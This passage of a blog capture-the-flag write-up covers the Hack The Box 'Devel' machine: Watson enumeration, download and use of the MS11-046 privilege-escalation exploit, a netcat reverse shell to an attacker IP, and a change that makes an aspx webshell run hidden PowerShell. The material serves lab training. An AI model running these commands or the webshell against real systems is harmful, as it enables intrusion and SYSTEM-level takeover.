+<span class="n">Mode</span>                <span class="n">LastWriteTime</span>     <span class="n">Length</span> <span class="n">Name</span>                              
+<span class="p">----</span>                <span class="p">-------------</span>     <span class="p">------</span> <span class="p">----</span>                              
+<span class="n">d</span><span class="p">----</span>         <span class="n">14</span><span class="p">/</span><span class="n">7</span><span class="p">/</span><span class="n">2009</span>   <span class="n">5</span><span class="err">:</span><span class="n">37</span> <span class="p">??</span>            <span class="n">v1</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">3705</span>                         
+<span class="n">d</span><span class="p">----</span>         <span class="n">14</span><span class="p">/</span><span class="n">7</span><span class="p">/</span><span class="n">2009</span>   <span class="n">5</span><span class="err">:</span><span class="n">37</span> <span class="p">??</span>            <span class="n">v1</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">4322</span>                         
+<span class="n">d</span><span class="p">----</span>         <span class="n">18</span><span class="p">/</span><span class="n">3</span><span class="p">/</span><span class="n">2017</span>   <span class="n">1</span><span class="err">:</span><span class="n">06</span> <span class="p">??</span>            <span class="n">v2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">50727</span>                        
+<span class="n">d</span><span class="p">----</span>         <span class="n">14</span><span class="p">/</span><span class="n">7</span><span class="p">/</span><span class="n">2009</span>   <span class="n">7</span><span class="err">:</span><span class="n">56</span> <span class="p">??</span>            <span class="n">v3</span><span class="p">.</span><span class="n">0</span>                              
+<span class="n">d</span><span class="p">----</span>         <span class="n">14</span><span class="p">/</span><span class="n">7</span><span class="p">/</span><span class="n">2009</span>   <span class="n">7</span><span class="err">:</span><span class="n">52</span> <span class="p">??</span>            <span class="n">v3</span><span class="p">.</span><span class="n">5</span>
+</pre></div>
+
+
+<p>Version 3.5 is very popular, and Watson should be compatible.  We can set the target build Framework in the project Properties menu under Application.</p>
+<p><img alt="Setting to .NET 3.5 for execution" src="images/ctf/htb/devel/watson_set_dotnet_ver.png"></p>
+<p>Once that's done, we set the solution to Release and Build (Ctrl + B).  Now we can copy the compiled binary and host it on Kali.</p>
+<p>We can allow Devel access to Watson and any other binaries we create by hosting it on a public SMB share.  Impackets <code>smbserver</code> utility is perfect for this.</p>
+<h4>Impacket smbserver</h4>
+<div class="highlight"><pre><span></span><span class="c1"># /usr/bin/impacket-smbserver -smb2support share .</span>
+Impacket v0.9.20 - Copyright <span class="m">2019</span> SecureAuth Corporation
+
+<span class="o">[</span>*<span class="o">]</span> Config file parsed
+<span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span>*<span class="o">]</span> Config file parsed
+<span class="o">[</span>*<span class="o">]</span> Config file parsed
+<span class="o">[</span>*<span class="o">]</span> Config file parsed
+</pre></div>
+
+
+<p>This will allow all content in the current directory to be accessible by SMB at <code>\\&lt;VPN IP&gt;\share\</code>.  Now we should be able to execute Watson without touching disk!</p>
+<h4>Watson.exe</h4>
+<div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="p">\\</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">22</span><span class="p">\</span><span class="n">share</span><span class="p">\</span><span class="n">Watson</span><span class="p">.</span><span class="n">exe</span>
+  <span class="n">__</span>    <span class="n">__</span>      <span class="n">_</span>
+ <span class="p">/</span> <span class="p">/</span> <span class="p">/\</span> <span class="p">\</span> <span class="p">\</span><span class="n">__</span> <span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span> <span class="n">___</span>  <span class="n">___</span>  <span class="n">_</span> <span class="n">__</span>
+ <span class="p">\</span> <span class="p">\/</span>  <span class="p">\/</span> <span class="p">/</span> <span class="n">_</span><span class="p">`</span> <span class="p">|</span> <span class="n">__</span><span class="p">/</span> <span class="n">__</span><span class="p">|/</span> <span class="n">_</span> <span class="p">\|</span> <span class="err">&#39;</span><span class="n">_</span> <span class="p">\</span>
+  <span class="p">\</span>  <span class="p">/\</span>  <span class="p">/</span> <span class="p">(</span><span class="n">_</span><span class="p">|</span> <span class="p">|</span> <span class="p">|</span><span class="n">_</span><span class="p">\</span><span class="n">__</span> <span class="p">\</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
+   <span class="p">\/</span>  <span class="p">\/</span> <span class="p">\</span><span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="p">|\</span><span class="n">__</span><span class="p">|</span><span class="n">___</span><span class="p">/\</span><span class="n">___</span><span class="p">/|</span><span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span><span class="p">|</span>
+
+                           <span class="n">v0</span><span class="p">.</span><span class="n">1</span>
+
+                  <span class="n">Sherlock</span> <span class="n">sucks</span><span class="p">...</span>
+                   <span class="nv">@_RastaMouse</span>
+
+ <span class="p">[*]</span> <span class="n">OS</span> <span class="n">Build</span> <span class="n">number</span><span class="err">:</span> <span class="n">7600</span>
+ <span class="p">[*]</span> <span class="n">CPU</span> <span class="n">Address</span> <span class="n">Width</span><span class="err">:</span> <span class="n">32</span>
+ <span class="p">[*]</span> <span class="k">Process</span> <span class="n">IntPtr</span> <span class="n">Size</span><span class="err">:</span> <span class="n">4</span>
+ <span class="p">[*]</span> <span class="n">Using</span> <span class="n">Windows</span> <span class="n">path</span><span class="err">:</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">WINDOWS</span><span class="p">\</span><span class="n">System32</span>
+
+  <span class="p">[*]</span> <span class="n">Appears</span> <span class="n">vulnerable</span> <span class="n">to</span> <span class="n">MS10</span><span class="p">-</span><span class="n">073</span>
+   <span class="p">[&gt;]</span> <span class="n">Description</span><span class="err">:</span> <span class="n">Kernel-mode</span> <span class="n">drivers</span> <span class="n">load</span> <span class="n">unspecified</span> <span class="n">keyboard</span> <span class="n">layers</span> <span class="n">improperly</span><span class="p">,</span> <span class="n">which</span> <span class="n">result</span> <span class="k">in</span> <span class="n">arbitrary</span> <span class="n">code</span> <span class="n">execution</span> <span class="k">in</span> <span class="n">the</span> <span class="n">kernel</span><span class="p">.</span>
+   <span class="p">[&gt;]</span> <span class="n">Exploit</span><span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">www</span><span class="p">.</span><span class="n">exploit-db</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">exploits</span><span class="p">/</span><span class="n">36327</span><span class="p">/</span>
+   <span class="p">[&gt;]</span> <span class="n">Notes</span><span class="err">:</span> <span class="n">None</span><span class="p">.</span>
+
+  <span class="p">[*]</span> <span class="n">Appears</span> <span class="n">vulnerable</span> <span class="n">to</span> <span class="n">MS10</span><span class="p">-</span><span class="n">092</span>
+   <span class="p">[&gt;]</span> <span class="n">Description</span><span class="err">:</span> <span class="n">When</span> <span class="n">processing</span> <span class="n">task</span> <span class="n">files</span><span class="p">,</span> <span class="n">the</span> <span class="n">Windows</span> <span class="n">Task</span> <span class="n">Scheduler</span> <span class="n">only</span> <span class="n">uses</span> <span class="n">a</span> <span class="n">CRC32</span> <span class="n">checksum</span> <span class="n">to</span> <span class="n">validate</span> <span class="n">that</span> <span class="n">the</span> <span class="n">file</span> <span class="n">has</span> <span class="n">not</span> <span class="n">been</span> <span class="n">tampered</span> <span class="n">with</span>
+<span class="p">.</span><span class="n">Also</span><span class="p">,</span> <span class="k">In</span> <span class="n">a</span> <span class="k">default</span> <span class="n">configuration</span><span class="p">,</span> <span class="n">normal</span> <span class="n">users</span> <span class="n">can</span> <span class="n">read</span> <span class="n">and</span> <span class="nb">write </span><span class="n">the</span> <span class="n">task</span> <span class="n">files</span> <span class="n">that</span> <span class="n">they</span> <span class="n">have</span> <span class="n">created</span><span class="p">.</span><span class="n">By</span> <span class="n">modifying</span> <span class="n">the</span> <span class="n">task</span> <span class="n">file</span> <span class="n">and</span> <span class="n">creating</span> <span class="n">a</span> <span class="n">CRC32</span> <span class="n">c</span>
+<span class="n">ollision</span><span class="p">,</span> <span class="n">an</span> <span class="n">attacker</span> <span class="n">can</span> <span class="n">execute</span> <span class="n">arbitrary</span> <span class="n">commands</span> <span class="n">with</span> <span class="n">SYSTEM</span> <span class="n">privileges</span><span class="p">.</span>
+   <span class="p">[&gt;]</span> <span class="n">Exploit</span><span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">rapid7</span><span class="p">/</span><span class="n">metasploit-framework</span><span class="p">/</span><span class="n">blob</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="n">modules</span><span class="p">/</span><span class="n">exploits</span><span class="p">/</span><span class="n">windows</span><span class="p">/</span><span class="n">local</span><span class="p">/</span><span class="n">ms10_092_schelevator</span><span class="p">.</span><span class="n">rb</span>
+   <span class="p">[&gt;]</span> <span class="n">Notes</span><span class="err">:</span> <span class="n">None</span><span class="p">.</span>
+
+  <span class="p">[*]</span> <span class="n">Appears</span> <span class="n">vulnerable</span> <span class="n">to</span> <span class="n">MS11</span><span class="p">-</span><span class="n">046</span>
+   <span class="p">[&gt;]</span> <span class="n">Description</span><span class="err">:</span> <span class="n">The</span> <span class="n">Ancillary</span> <span class="k">Function</span> <span class="n">Driver</span> <span class="p">(</span><span class="n">AFD</span><span class="p">)</span> <span class="k">in</span> <span class="n">afd</span><span class="p">.</span><span class="n">sys</span> <span class="n">does</span> <span class="n">not</span> <span class="n">properly</span> <span class="n">validate</span> <span class="n">user-mode</span> <span class="n">input</span><span class="p">,</span> <span class="n">which</span> <span class="n">allows</span> <span class="n">local</span> <span class="n">users</span> <span class="n">to</span> <span class="n">elevate</span> <span class="n">privile</span>
+<span class="n">ges</span><span class="p">.</span>
+   <span class="p">[&gt;]</span> <span class="n">Exploit</span><span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">www</span><span class="p">.</span><span class="n">exploit-db</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">exploits</span><span class="p">/</span><span class="n">40564</span><span class="p">/</span>
+   <span class="p">[&gt;]</span> <span class="n">Notes</span><span class="err">:</span> <span class="n">None</span><span class="p">.</span>
+
+  <span class="p">[*]</span> <span class="n">Appears</span> <span class="n">vulnerable</span> <span class="n">to</span> <span class="n">MS12</span><span class="p">-</span><span class="n">042</span>
+   <span class="p">[&gt;]</span> <span class="n">Description</span><span class="err">:</span> <span class="n">An</span> <span class="n">EoP</span> <span class="n">exists</span> <span class="n">due</span> <span class="n">to</span> <span class="n">the</span> <span class="n">way</span> <span class="n">the</span> <span class="n">Windows</span> <span class="n">User</span> <span class="n">Mode</span> <span class="n">Scheduler</span> <span class="n">handles</span> <span class="n">system</span> <span class="n">requests</span><span class="p">,</span> <span class="n">which</span> <span class="n">can</span> <span class="n">be</span> <span class="n">exploited</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">arbitrary</span> <span class="n">code</span>
+ <span class="k">in</span> <span class="n">kernel</span> <span class="n">mode</span><span class="p">.</span>
+   <span class="p">[&gt;]</span> <span class="n">Exploit</span><span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">www</span><span class="p">.</span><span class="n">exploit-db</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">exploits</span><span class="p">/</span><span class="n">20861</span><span class="p">/</span>
+   <span class="p">[&gt;]</span> <span class="n">Notes</span><span class="err">:</span> <span class="n">None</span><span class="p">.</span>
+
+  <span class="p">[*]</span> <span class="n">Appears</span> <span class="n">vulnerable</span> <span class="n">to</span> <span class="n">MS13</span><span class="p">-</span><span class="n">005</span>
+   <span class="p">[&gt;]</span> <span class="n">Description</span><span class="err">:</span> <span class="n">Due</span> <span class="n">to</span> <span class="n">a</span> <span class="n">problem</span> <span class="n">with</span> <span class="n">isolating</span> <span class="n">window</span> <span class="n">broadcast</span> <span class="n">messages</span> <span class="k">in</span> <span class="n">the</span> <span class="n">Windows</span> <span class="n">kernel</span><span class="p">,</span> <span class="n">an</span> <span class="n">attacker</span> <span class="n">can</span> <span class="n">broadcast</span> <span class="n">commands</span> <span class="n">from</span> <span class="n">a</span> <span class="n">lower</span> <span class="n">Integ</span>
+<span class="n">rity</span> <span class="n">Level</span> <span class="k">process</span> <span class="n">to</span> <span class="n">a</span> <span class="n">higher</span> <span class="n">Integrity</span> <span class="n">Level</span> <span class="k">process</span><span class="p">,</span> <span class="n">thereby</span> <span class="n">effecting</span> <span class="n">a</span> <span class="n">privilege</span> <span class="n">escalation</span><span class="p">.</span>
+   <span class="p">[&gt;]</span> <span class="n">Exploit</span><span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">rapid7</span><span class="p">/</span><span class="n">metasploit-framework</span><span class="p">/</span><span class="n">blob</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="n">modules</span><span class="p">/</span><span class="n">exploits</span><span class="p">/</span><span class="n">windows</span><span class="p">/</span><span class="n">local</span><span class="p">/</span><span class="n">ms13_005_hwnd_broadcast</span><span class="p">.</span><span class="n">rb</span>
+   <span class="p">[&gt;]</span> <span class="n">Notes</span><span class="err">:</span> <span class="n">None</span><span class="p">.</span>
+
+ <span class="p">[*]</span> <span class="n">Finished</span><span class="p">.</span> <span class="n">Found</span> <span class="n">5</span> <span class="n">vulns</span> <span class="err">:</span><span class="p">)</span>
+<span class="n">ERROR</span><span class="p">&gt;</span> <span class="n">The</span> <span class="n">given</span> <span class="n">key</span> <span class="n">was</span> <span class="n">not</span> <span class="n">present</span> <span class="k">in</span> <span class="n">the</span> <span class="n">dictionary</span><span class="p">.</span>
+<span class="n">ERROR</span><span class="p">&gt;</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">WINDOWS</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">win32kfull</span><span class="p">.</span><span class="n">sys</span>
+<span class="n">ERROR</span><span class="p">&gt;</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">WINDOWS</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">gdiplus</span><span class="p">.</span><span class="n">dll</span>
+<span class="n">ERROR</span><span class="p">&gt;</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">WINDOWS</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">coremessaging</span><span class="p">.</span><span class="n">dll</span>
+</pre></div>
+
+
+<p>There are several exploits to choose from, but we only need one good exploit.</p>
+<h2>Web -&gt; System: MS11-046</h2>
+<p><a href="https://twitter.com/abatchy17">@abatchy</a> hosts a Github repo for <a href="https://github.com/abatchy17/WindowsExploits">several Windows exploits</a>, one of which is for <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046">MS11-046</a>.  This exploits a vulnerability in the Ancillary Function Driver to execute code as System.</p>
+<p>Reviewing the exploit source code, I located a very pleasant feature on line 801:</p>
+<div class="highlight"><pre><span></span>    <span class="c1">// spawn shell (with elevated privileges)</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;         [*] Spawning shell</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="c1">// spawn SYSTEM shell within the current shell (remote shell friendly)</span>
+    <span class="n">system</span> <span class="p">(</span><span class="s">&quot;c:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">system32</span><span class="se">\\</span><span class="s">cmd.exe /K cd c:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">system32&quot;</span><span class="p">);</span>
+</pre></div>
+
+
+<p>Many local exploits are more or less incompatible with remote shells; they simply don't accomodate them, typically opening a new window or the like.  They would be fine with a Remote Desktop session, but not this.</p>
+<p>This exploit, however, states that it's compatible with remote shells; this feature is precisely the functionality that we need for this situation.</p>
+<p>We can download the source and/or executable by using wget (preferably into the SMB directory):</p>
+<div class="highlight"><pre><span></span><span class="c1"># wget https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe</span>
+--2020-02-17 <span class="m">22</span>:34:12--  https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe
+Resolving github.com <span class="o">(</span>github.com<span class="o">)</span>... <span class="m">192</span>.30.255.112
+Connecting to github.com <span class="o">(</span>github.com<span class="o">)</span><span class="p">|</span><span class="m">192</span>.30.255.112<span class="p">|</span>:443... connected.
+HTTP request sent, awaiting response... <span class="m">302</span> Found
+Location: https://raw.githubusercontent.com/abatchy17/WindowsExploits/master/MS11-046/MS11-046.exe <span class="o">[</span>following<span class="o">]</span>
+--2020-02-17 <span class="m">22</span>:34:12--  https://raw.githubusercontent.com/abatchy17/WindowsExploits/master/MS11-046/MS11-046.exe
+Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... <span class="m">151</span>.101.128.133, <span class="m">151</span>.101.192.133, <span class="m">151</span>.101.0.133, ...
+Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span><span class="p">|</span><span class="m">151</span>.101.128.133<span class="p">|</span>:443... connected.
+HTTP request sent, awaiting response... <span class="m">200</span> OK
+Length: <span class="m">112815</span> <span class="o">(</span>110K<span class="o">)</span> <span class="o">[</span>application/octet-stream<span class="o">]</span>
+Saving to: ‘MS11-046.exe’
+
+MS11-046.exe                           <span class="m">100</span>%<span class="o">[==========================================================================</span>&gt;<span class="o">]</span> <span class="m">110</span>.17K  --.-KB/s    in <span class="m">0</span>.05s
+
+<span class="m">2020</span>-02-17 <span class="m">22</span>:34:13 <span class="o">(</span><span class="m">2</span>.31 MB/s<span class="o">)</span> - ‘MS11-046.exe’ saved <span class="o">[</span><span class="m">112815</span>/112815<span class="o">]</span>
+</pre></div>
+
+
+<p>Running it on the server:</p>
+<p><img alt="And! ... Nothing." src="images/ctf/htb/devel/privesc_exploit_failed.png"></p>
+<p>No elevated shell...  It appears that the exploit worked and executed the elevated code, so what gives?</p>
+<p>My theory is that the <code>Invoke-PowerShellTcp</code> function isn't compatible with the exploit.  To test, I located <code>nc.exe</code>, a netcat Windows binary, and set up a new reverse shell through ncat.</p>
+<p>In a new terminal on Kali:</p>
+<div class="highlight"><pre><span></span><span class="c1"># rlwrap ncat -nvlp 4444</span>
+Ncat: Version <span class="m">7</span>.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::4444
+Ncat: Listening on <span class="m">0</span>.0.0.0:4444
+</pre></div>
+
+
+<p>In the Windows shell:</p>
+<div class="highlight"><pre><span></span><span class="p">\\</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">22</span><span class="p">\</span><span class="n">share</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-e</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">22</span> <span class="n">4444</span>
+</pre></div>
+
+
+<p>Back to the new listener:</p>
+<div class="highlight"><pre><span></span><span class="n">Ncat</span><span class="err">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">5</span><span class="p">.</span>
+<span class="n">Ncat</span><span class="err">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">5</span><span class="err">:</span><span class="n">49191</span><span class="p">.</span>
+<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="no">[Version 6.1.7600]</span>
+<span class="n">Copyright</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">2009</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span>  <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+
+<span class="n">c</span><span class="err">:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">&gt;</span>
+</pre></div>
+
+
+<p>Now we have a 'pure' netcat reverse shell.  Executing the exploit again,</p>
+<p><img alt="" src="images/ctf/htb/devel/get_system.png"></p>
+<p>My theory appears to have been correct!  From here, it is trivially easy to locate and read from the flag files.</p>
+<p><img alt="Both 32 bytes long, the length of an MD5 hash" src="images/ctf/htb/devel/list_flags.png"></p>
+<p>This concludes the Devel writeup, and any further content is expanding on the above.</p>
+<p>Thank you for reading!</p>
+<h2>Modifying the aspx webshell for PowerShell execution</h2>
+<p>To modify the webshell to execute PowerShell as a default, simply replace lines 11 and 12:</p>
+<div class="highlight"><pre><span></span><span class="err">psi.FileName = &quot;cmd.exe&quot;;</span>
+<span class="err">psi.Arguments = &quot;/c &quot;+arg;</span>
+</pre></div>
+
+
+<p>With:</p>
+<div class="highlight"><pre><span></span><span class="err">psi.FileName = &quot;powershell.exe&quot;;</span>
+<span class="err">psi.Arguments = &quot;-NoP -NonI -W Hidden -Exec Bypass \&quot;&quot;+arg+&quot;\&quot;&quot;;</span>
+</pre></div>
+
+
+<p>PowerShell execution brings with it a massive improvement of usability and functionality; we can do practically anything in the Windows environment.  This isn't strictly necessary, but could be useful.</p>
+            <div class="hr"></div>
+            <a href="#" class="go-top">Go Top</a>
+<footer class="footer">
+    <p>&copy; LogistyxCat &ndash;
+        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
+        for <a href="http://blog.getpelican.com/">Pelican</a>
+    </p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+</body>
+</html>
